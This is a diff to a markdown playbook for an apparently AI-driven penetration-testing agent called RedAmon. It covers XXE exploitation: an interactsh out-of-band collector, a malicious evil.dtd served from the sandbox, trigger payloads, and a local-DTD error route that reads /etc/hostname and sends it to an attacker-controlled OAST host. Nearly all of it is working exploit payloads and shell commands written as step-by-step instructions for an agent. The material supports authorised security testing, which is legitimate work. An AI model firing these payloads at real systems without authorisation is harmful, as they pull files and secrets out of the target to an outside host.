@@ -75,14 +75,14 @@ When HTTP Traffic Capture is enabled, redamon.sitemap and redamon.query surface 
 
 4. **Enumerate XML-bearing upload surfaces.** If file uploads exist in the recon graph, mark SVG, MathML, DOCX, XLSX, PPTX, ODT, ODS, plist, RSS/Atom feeds, WSDL imports and SAML metadata XML for later phase-2 testing.
 
-5. **Spin up an OOB collector** (used in Phase 2 and Phase 3) so its callback URL is ready before you fire blind payloads. `interactsh-client` prints the registered domain to stdout and writes incoming interactions to the `-o` file, so capture both:
+5. **Spin up an OOB collector** (used in Phase 2 and Phase 3) so its callback URL is ready before you fire blind payloads. `interactsh-client` prints the registered domain to stdout and writes incoming interactions to the `-o` file, so capture both: Replace `RUN` with a short random token you pick once for this workflow (for example the output of `openssl rand -hex 4`) and reuse it in every file name: all your chats share your sandbox's `/tmp`, so a fixed name would read another chat's callbacks as this one's.
    ```bash
-   interactsh-client -v -o /tmp/xxe-oast.hits >/tmp/xxe-oast.out 2>&1 &
+   interactsh-client -v -o /tmp/xxe-oast-RUN.hits >/tmp/xxe-oast-RUN.out 2>&1 &
    sleep 5
-   OAST_HOST=$(grep -oE '[a-z0-9]{20,40}\.oast\.[a-z]+' /tmp/xxe-oast.out | head -1)
+   OAST_HOST=$(grep -oE '[a-z0-9]{20,40}\.oast\.[a-z]+' /tmp/xxe-oast-RUN.out | head -1)
    echo "OAST_HOST=$OAST_HOST"
    ```
-   Use `tail -f /tmp/xxe-oast.hits` (or `tail -n 100 /tmp/xxe-oast.out`) later to read the actual DNS/HTTP callbacks.
+   Use `tail -f /tmp/xxe-oast-RUN.hits` (or `tail -n 100 /tmp/xxe-oast-RUN.out`) later to read the actual DNS/HTTP callbacks.
 
 6. **Decide the parser-capability oracle** to use during exploitation: visible reflection in the response, error message length/shape diff, ETag/Content-Length diff, or OOB DNS/HTTP hits.
 
@@ -146,7 +146,7 @@ GCP, Azure, Alibaba and Oracle Cloud metadata variants follow the same shape; ro
 
 #### 2.3 Out-of-band parameter entity (blind XXE)
 
-When nothing reflects, use parameter entities + an external DTD. Host the DTD on a server you control. The simplest path is to drop it onto a temporary `python3 -m http.server` running on the same Kali sandbox and tunnel it out with `ngrok` if needed, or serve it from a `RequestBin`/`Webhook.site` style endpoint via `kali_shell`.
+When nothing reflects, use parameter entities + an external DTD the target fetches from a host it can reach. Two roles, do NOT conflate them: interactsh (OAST) CAPTURES the exfiltrated data (it logs the request) but CANNOT serve a DTD body; the DTD must be served by a host that returns a body. Serve `evil.dtd` yourself on your ONE target-reachable inbound port, which is two DIFFERENT numbers from the "Pre-Configured Payload Settings" block: the server LISTENS on your handler port (the pool port, or `4444` when a tunnel is active, its ReverseListenerBindPort), while the target fetches the DTD at the block's `LHOST:LPORT` (the public port a tunnel forwards in; with ngrok the two differ). Your tunnel is RedAmon-managed; do NOT start `ngrok`/`chisel` yourself, and never serve on 8000 (the sandbox's own service). With no reachable inbound port, serve the DTD from a webhook.site / RequestBin-style endpoint that returns a body, or use the local-DTD error route below.
 
 DTD file (`evil.dtd`) staged from `execute_code`:
 ```python
@@ -159,23 +159,31 @@ dtd = '''<!ENTITY % data SYSTEM "file:///etc/hostname">
 open('/tmp/evil.dtd','w').write(dtd)
 ```
 
-Serve the DTD:
+`OAST_HOST` inside the DTD is the interactsh domain (it CAPTURES `d=%data;`). Serve the DTD
+from a DEDICATED folder holding only that file (never serve `/tmp`: execute_code leaves
+scripts with target creds there). The listen port is your reverse handler's, so run `jobs`
+/ `ss -ltn` first: while this server holds it, NO Metasploit handler can bind that port,
+for ANY of your chats, so `kill` it the instant the DTD has been fetched. Keep python the ONLY
+backgrounded command (setup joined by `;`, every stream redirected, the log OUTSIDE the served
+folder): backgrounding an `&&` list holds kali_shell's output pipe open until its 300 s timeout
+and makes `$!` the subshell, and a log inside the folder is readable by the target:
 ```bash
-cd /tmp && python3 -m http.server 8088 >/tmp/http.log 2>&1 &
-# expose if needed
-ngrok http 8088 >/tmp/ngrok.log 2>&1 &
+mkdir -p /tmp/xxe_dtd && mv /tmp/evil.dtd /tmp/xxe_dtd/; python3 -m http.server <listen_port> --directory /tmp/xxe_dtd >/tmp/xxe_dtd.srv.log 2>&1 </dev/null & echo $!
+curl -s http://127.0.0.1:<listen_port>/evil.dtd >/dev/null && echo up   # a backgrounded (... &) prints up even on a FAILED bind
 ```
+With no reachable inbound port, serve `evil.dtd` from a webhook.site-style host, or use the
+local-DTD error route below (no hosting; the exfil entity still points at `OAST_HOST`).
 
-Trigger payload:
+Trigger payload (DTD-HOST = the block's `LHOST:LPORT`, or your webhook host - NOT the OAST domain, which cannot serve the DTD):
 ```xml
 <?xml version="1.0"?>
-<!DOCTYPE r [<!ENTITY % dtd SYSTEM "http://OAST_HOST/evil.dtd"> %dtd;]>
+<!DOCTYPE r [<!ENTITY % dtd SYSTEM "http://DTD-HOST/evil.dtd"> %dtd;]>
 <r>fire</r>
 ```
 
 Confirm by tailing the OOB log:
 ```bash
-tail -n 50 /tmp/xxe-oast.hits
+tail -n 50 /tmp/xxe-oast-RUN.hits
 ```
 
 For files that contain newlines (and would break query strings), error-based exfiltration via a forced parser failure works too:
@@ -185,6 +193,22 @@ For files that contain newlines (and would break query strings), error-based exf
 %err;
 %broken;
 ```
+
+Local-DTD route (no hosting needed, for when you have no reachable inbound port): repurpose a DTD already on the target (e.g. `file:///usr/share/xml/fontconfig/fonts.dtd` on many Linux images) and point the exfil entity at `OAST_HOST`, which captures the data:
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE r [
+  <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
+  <!ENTITY % expr 'aaa)>
+    <!ENTITY &#x25; file SYSTEM "file:///etc/hostname">
+    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; send SYSTEM &#x27;http://OAST_HOST/?d=&#x25;file;&#x27;>">
+    &#x25;eval; &#x25;send;
+    <!ELEMENT aa (bb'>
+  %local_dtd;
+]>
+<r></r>
+```
+To read the data in the parser error instead (no egress at all), swap the URL for `file:///nonexistent/&#x25;file;`.
 
 #### 2.4 XInclude (entities disabled, transclusion still open)
 
